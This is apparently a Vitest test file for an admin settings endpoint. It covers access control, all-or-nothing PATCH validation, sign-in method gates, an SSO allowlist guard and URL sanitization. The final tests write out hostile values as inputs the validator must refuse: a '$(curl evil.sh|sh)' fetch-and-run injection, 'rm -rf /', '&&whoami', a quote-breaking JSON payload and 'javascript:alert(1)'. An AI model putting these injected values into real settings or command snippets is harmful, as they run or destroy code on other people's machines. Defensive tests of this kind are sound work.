/**
 * GET/PATCH /admin/settings — the server-wide settings the admin edits from
 * the Settings page. This endpoint mutates process.env live and persists to the
 * server_settings DB table (durable + shared across instances; the .env-file
 * persistence it replaced was wiped by every Cloud Run rebuild). It is
 * security-sensitive: only the admin may reach it, validation must reject bad
 * values, and a partially-invalid PATCH must apply nothing (the response code
 * and server state must agree).
 */
import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import {
  setupTestEnv,
  createTestApp,
  registerUser,
  jsonRequest,
} from "./helpers";

/** Read a persisted setting straight from the DB the running app uses. */
async function persistedSetting(key: string): Promise<string | null | undefined> {
  const { getDb } = await import("../src/db/client.js");
  const row = (await getDb().get(
    "SELECT value FROM server_settings WHERE key = ?",
    [key],
  )) as { value: string | null } | undefined;
  return row ? row.value : undefined;
}

const OWNER_EMAIL = "owner@example.com";

let env: ReturnType<typeof setupTestEnv>;

// process.env settings touched by these tests — cleared between cases so one
// test's mutation can't leak into the next.
const SETTING_ENV = [
  "PROMPTOWL_SIGN_IN_GATE",
  "MANUAL_SIGN_IN",
  "LOGO_URL",
  "COMMUNITY_NAME",
  "PUBLIC_BASE_URL",
  "MAX_BODY_BYTES",
  "FEATURE_WORKFLOW_PLANE",
  "FEATURE_SUBAGENT_RUNS",
  "POSTHOG_KEY",
  "POSTHOG_HOST",
  "TELEMETRY_ENABLED",
];

beforeEach(() => {
  env = setupTestEnv();
  for (const k of SETTING_ENV) delete process.env[k];
});

afterEach(() => {
  for (const k of SETTING_ENV) delete process.env[k];
  env.cleanup();
});

describe("/admin/settings — access control (key mode)", () => {
  it("403s a non-admin on GET and PATCH", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const stranger = await registerUser(app, "stranger@example.com");

    const get = await jsonRequest(app, "GET", "/admin/settings", undefined, stranger.apiKey);
    expect(get.status).toBe(403);

    const patch = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { logo_url: "https://evil.example/x.png" },
      stranger.apiKey,
    );
    expect(patch.status).toBe(403);
  });

  it("401s an unauthenticated caller in key mode", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const res = await app.request("/admin/settings", { method: "GET" });
    expect(res.status).toBe(401);
  });

  it("allows the anonymous admin in open mode", async () => {
    const app = await createTestApp("open");
    const get = await jsonRequest(app, "GET", "/admin/settings");
    expect(get.status).toBe(200);
    expect(get.data.promptowl_sign_in_gate).toBe("open");
  });
});

describe("/admin/settings — admin round-trip (key mode)", () => {
  it("GET returns current settings and PATCH applies them live + persists", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    const before = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
    expect(before.status).toBe(200);
    expect(before.data.promptowl_sign_in_gate).toBe("open");

    const patch = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      {
        promptowl_sign_in_gate: "admin-only",
        logo_url: "https://cdn.example/logo.png",
        public_base_url: "https://nest.example/",
        max_body_bytes: 20 * 1024 * 1024,
      },
      admin.apiKey,
    );
    expect(patch.status).toBe(200);
    // Response reflects the new values; trailing slash stripped on base URL.
    expect(patch.data.settings.promptowl_sign_in_gate).toBe("admin-only");
    expect(patch.data.settings.logo_url).toBe("https://cdn.example/logo.png");
    expect(patch.data.settings.public_base_url).toBe("https://nest.example");
    expect(patch.data.settings.max_body_bytes).toBe(20 * 1024 * 1024);

    // Live: a fresh GET (config getters read process.env) shows the new values.
    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
    expect(after.data.promptowl_sign_in_gate).toBe("admin-only");
    expect(after.data.max_body_bytes).toBe(20 * 1024 * 1024);

    // Persisted: the DB rows carry the change across restart (and to every
    // other instance).
    expect(await persistedSetting("PROMPTOWL_SIGN_IN_GATE")).toBe("admin-only");
    expect(await persistedSetting("MAX_BODY_BYTES")).toBe("20971520");
  });
});

describe("/admin/settings — validation", () => {
  it("rejects a bad sign-in gate value", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);
    const res = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { promptowl_sign_in_gate: "nonsense" },
      admin.apiKey,
    );
    expect(res.status).toBe(400);
    expect(res.data.error).toMatch(/PromptOwl sign-in/i);
    expect(res.data.fieldErrors).toHaveProperty("promptowl_sign_in_gate");
  });

  it("saves a trimmed community name, clears it with an empty string, rejects multi-line", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);
    const patch = (community_name: string) =>
      jsonRequest(app, "PATCH", "/admin/settings", { community_name }, admin.apiKey);

    const ok = await patch("  Acme Community ");
    expect(ok.status).toBe(200);
    expect(ok.data.settings.community_name).toBe("Acme Community");
    expect(await persistedSetting("COMMUNITY_NAME")).toBe("Acme Community");

    const bad = await patch("Acme\nEvil");
    expect(bad.status).toBe(400);
    expect(bad.data.fieldErrors).toHaveProperty("community_name");

    const cleared = await patch("");
    expect(cleared.data.settings.community_name).toBeNull();
  });

  it("saves a PostHog key, rejects a junk key and a non-URL host", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    const ok = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { posthog_key: "phc_TestProjectKey0123456789abcdefXYZ", posthog_host: "https://eu.i.posthog.com/" },
      admin.apiKey,
    );
    expect(ok.status).toBe(200);
    // Trailing slash stripped, same as public_base_url.
    expect(ok.data.settings.posthog_host).toBe("https://eu.i.posthog.com");
    expect(await persistedSetting("POSTHOG_KEY")).toBe("phc_TestProjectKey0123456789abcdefXYZ");

    // The browser gets the key from /health — but only while telemetry is on.
    const health = await jsonRequest(app, "GET", "/health");
    expect(health.data.posthog_key).toBe("phc_TestProjectKey0123456789abcdefXYZ");
    await jsonRequest(app, "PATCH", "/admin/settings", { telemetry_enabled: false }, admin.apiKey);
    const healthOff = await jsonRequest(app, "GET", "/health");
    expect(healthOff.data.posthog_key).toBeNull();

    const bad = await jsonRequest(
      app, "PATCH", "/admin/settings", { posthog_host: "not-a-url" }, admin.apiKey,
    );
    expect(bad.status).toBe(400);
    expect(bad.data.fieldErrors).toHaveProperty("posthog_host");

    // A junk key was accepted and saved as-is (CU-wdqcq027fr); it must be
    // rejected before anything is written, keyed to the field for the UI —
    // and the message must name the rule that failed, so a key with the
    // right prefix but half its length is not a mystery.
    const junk: Array<[string, RegExp]> = [
      ["abc123", /must start with phc_/],
      ["phx_TestProjectKey0123456789abcdefXYZ", /must start with phc_/],
      ["phc_ewrer", /too short/],
      ["phc_Test Project Key 0123456789abcdef", /letters and digits/],
    ];
    for (const [key, reason] of junk) {
      const badKey = await jsonRequest(
        app, "PATCH", "/admin/settings", { posthog_key: key }, admin.apiKey,
      );
      expect(badKey.status).toBe(400);
      expect(badKey.data.fieldErrors.posthog_key).toMatch(reason);
    }
    expect(await persistedSetting("POSTHOG_KEY")).toBe("phc_TestProjectKey0123456789abcdefXYZ");

    // Clearing the key is still allowed — that is how analytics turns off.
    const cleared = await jsonRequest(
      app, "PATCH", "/admin/settings", { posthog_key: "" }, admin.apiKey,
    );
    expect(cleared.status).toBe(200);
  });

  it("rejects an out-of-range max_body_bytes", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    const tooSmall = await jsonRequest(
      app, "PATCH", "/admin/settings", { max_body_bytes: 1024 }, admin.apiKey,
    );
    expect(tooSmall.status).toBe(400);

    const tooBig = await jsonRequest(
      app, "PATCH", "/admin/settings", { max_body_bytes: 999 * 1024 * 1024 }, admin.apiKey,
    );
    expect(tooBig.status).toBe(400);
  });

  it("rejects enabling sub-agent runs while the workflow plane is off", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    const res = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { subagent_runs_enabled: true },
      admin.apiKey,
    );
    expect(res.status).toBe(400);
    expect(res.data.error).toMatch(/Workflow plane/i);
    // Keyed to the field so the client focuses the right tab.
    expect(res.data.fieldErrors).toHaveProperty("subagent_runs_enabled");

    // Nothing applied — the flag stays off.
    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
    expect(after.data.subagent_runs_enabled).toBe(false);
  });

  it("enables plane + sub-agent runs together in one PATCH and persists both", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    const res = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { workflow_plane_enabled: true, subagent_runs_enabled: true },
      admin.apiKey,
    );
    expect(res.status).toBe(200);
    expect(res.data.settings.workflow_plane_enabled).toBe(true);
    expect(res.data.settings.subagent_runs_enabled).toBe(true);

    expect(await persistedSetting("FEATURE_WORKFLOW_PLANE")).toBe("true");
    expect(await persistedSetting("FEATURE_SUBAGENT_RUNS")).toBe("true");

    // And it can be turned back off (null tombstones the row → falls to default).
    const off = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { subagent_runs_enabled: false },
      admin.apiKey,
    );
    expect(off.status).toBe(200);
    expect(off.data.settings.subagent_runs_enabled).toBe(false);
    expect(await persistedSetting("FEATURE_SUBAGENT_RUNS")).toBeNull();
  });

  it("applies NOTHING when one field of a multi-field PATCH is invalid", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    // logo_url is valid; promptowl_sign_in_gate is not. The whole request must
    // fail (400) and the valid field must NOT be applied or persisted.
    const res = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { logo_url: "https://cdn.example/logo.png", promptowl_sign_in_gate: "bogus" },
      admin.apiKey,
    );
    expect(res.status).toBe(400);

    // Live state unchanged: logo_url still at its default (null).
    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
    expect(after.data.logo_url).toBeNull();

    // Nothing persisted: no LOGO_URL row was written.
    expect(await persistedSetting("LOGO_URL")).toBeUndefined();
  });
});

describe("/admin/settings — sign-in method gates", () => {
  it("defaults manual sign-in to open and persists invite-only / disabled", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    const before = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
    expect(before.data.manual_sign_in).toBe("open");

    const invite = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { manual_sign_in: "invite-only" },
      admin.apiKey,
    );
    expect(invite.status).toBe(200);
    expect(invite.data.settings.manual_sign_in).toBe("invite-only");
    expect(await persistedSetting("MANUAL_SIGN_IN")).toBe("invite-only");

    const off = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { manual_sign_in: "disabled" },
      admin.apiKey,
    );
    expect(off.status).toBe(200);
    expect(await persistedSetting("MANUAL_SIGN_IN")).toBe("disabled");
  });

  it("rejects an invalid manual_sign_in value", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);
    const res = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { manual_sign_in: "nonsense" },
      admin.apiKey,
    );
    expect(res.status).toBe(400);
    expect(res.data.error).toMatch(/Manual sign-in/i);
    expect(res.data.fieldErrors).toHaveProperty("manual_sign_in");
  });

  it("rejects disabling BOTH manual and PromptOwl sign-in in one PATCH", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    const res = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { manual_sign_in: "disabled", promptowl_sign_in_gate: "disabled" },
      admin.apiKey,
    );
    expect(res.status).toBe(400);
    expect(res.data.error).toMatch(/both/i);

    // Nothing applied — manual stays open.
    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
    expect(after.data.manual_sign_in).toBe("open");
  });

  it("rejects disabling manual when PromptOwl is ALREADY disabled (config fallback)", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    // Turn PromptOwl off first — valid, manual still open.
    const off = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { promptowl_sign_in_gate: "disabled" },
      admin.apiKey,
    );
    expect(off.status).toBe(200);

    // Disabling manual alone now would leave no method — rejected via the
    // effective-state fallback to current config (gate not in this body).
    const res = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { manual_sign_in: "disabled" },
      admin.apiKey,
    );
    expect(res.status).toBe(400);
    expect(res.data.error).toMatch(/both/i);
  });

  it("allows invite-only alongside PromptOwl disabled (login still works)", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    const res = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { manual_sign_in: "invite-only", promptowl_sign_in_gate: "disabled" },
      admin.apiKey,
    );
    expect(res.status).toBe(200);
    expect(res.data.settings.manual_sign_in).toBe("invite-only");
    expect(res.data.settings.promptowl_sign_in_gate).toBe("disabled");
  });

  it("allows manual disabled together with PromptOwl admin-only", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    const res = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { manual_sign_in: "disabled", promptowl_sign_in_gate: "admin-only" },
      admin.apiKey,
    );
    expect(res.status).toBe(200);
    expect(res.data.settings.manual_sign_in).toBe("disabled");
    expect(res.data.settings.promptowl_sign_in_gate).toBe("admin-only");
  });
});

describe("/admin/settings — agent SSO (token exchange) guard", () => {
  it("refuses to enable a provider while auto-provision has no domain allowlist", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);

    // Auto-provision defaults ON, allowlist defaults empty — enabling a
    // provider here would let any account at that IdP self-provision and mint
    // a bearer, so the save is refused.
    const blocked = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      { google_token_exchange_enabled: true, google_client_id: "gid" },
      admin.apiKey,
    );
    expect(blocked.status).toBe(400);
    expect(blocked.data.fieldErrors.google_token_exchange_enabled).toMatch(
      /allowed email domains/i,
    );
    // Rejected request applies NOTHING — not even the valid client id.
    expect(await persistedSetting("GOOGLE_CLIENT_ID")).toBeUndefined();

    // Same request WITH the allowlist in the same body is accepted.
    const ok = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      {
        google_token_exchange_enabled: true,
        google_client_id: "gid",
        oidc_allowed_domains: "example.com",
      },
      admin.apiKey,
    );
    expect(ok.status).toBe(200);
    expect(await persistedSetting("GOOGLE_TOKEN_EXCHANGE_ENABLED")).toBe("true");

    // Turning auto-provision off is the other accepted way out.
    const viaAutoProvisionOff = await jsonRequest(
      app,
      "PATCH",
      "/admin/settings",
      {
        ms_token_exchange_enabled: true,
        ms_client_id: "cid",
        ms_tenant_id: "tid",
        oidc_allowed_domains: "",
        oidc_auto_provision: false,
      },
      admin.apiKey,
    );
    expect(viaAutoProvisionOff.status).toBe(200);
  });
});

/**
 * public_base_url is spliced into the copy-paste snippets the Connecting-agents
 * panel renders — a `bash` block for Claude Code and Codex, and quoted strings
 * in config.toml / config.yaml / mcp.json for Codex, Hermes, Gemini CLI and
 * Cursor. Those are pasted verbatim into a teammate's terminal and config
 * files, so a value carrying shell metacharacters or a quote turns "can edit
 * server settings" into code execution on everyone else's machine. It was
 * stored with only a trim and a trailing-slash strip.
 */
describe("/admin/settings — public_base_url", () => {
  it("accepts a well-formed http(s) URL and strips the trailing slash", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);
    const ok = await jsonRequest(
      app, "PATCH", "/admin/settings", { public_base_url: "https://nest.example.com/" }, admin.apiKey,
    );
    expect(ok.status).toBe(200);
    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
    expect(after.data.public_base_url).toBe("https://nest.example.com");
  });

  it("refuses a value that is not a http(s) URL", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);
    for (const v of ["not-a-url", "ftp://nest.example.com", "javascript:alert(1)"]) {
      const bad = await jsonRequest(
        app, "PATCH", "/admin/settings", { public_base_url: v }, admin.apiKey,
      );
      expect(bad.status, `expected ${v} to be refused`).toBe(400);
      expect(bad.data.fieldErrors).toHaveProperty("public_base_url");
    }
  });

  it("refuses shell metacharacters and quotes, and writes nothing", async () => {
    const app = await createTestApp("key", { ownerEmail: OWNER_EMAIL });
    const admin = await registerUser(app, OWNER_EMAIL);
    await jsonRequest(
      app, "PATCH", "/admin/settings", { public_base_url: "https://good.example.com" }, admin.apiKey,
    );
    const hostile = [
      "https://x.example/a$(curl evil.sh|sh)",
      "https://x.example/a;rm -rf /",
      'https://x.example/a","evil":"1',
      "https://x.example/a&&whoami",
    ];
    for (const v of hostile) {
      const bad = await jsonRequest(
        app, "PATCH", "/admin/settings", { public_base_url: v }, admin.apiKey,
      );
      expect(bad.status, `expected ${v} to be refused`).toBe(400);
      expect(bad.data.fieldErrors).toHaveProperty("public_base_url");
    }
    // Refused before anything is written — the earlier good value survives.
    const after = await jsonRequest(app, "GET", "/admin/settings", undefined, admin.apiKey);
    expect(after.data.public_base_url).toBe("https://good.example.com");
  });
});

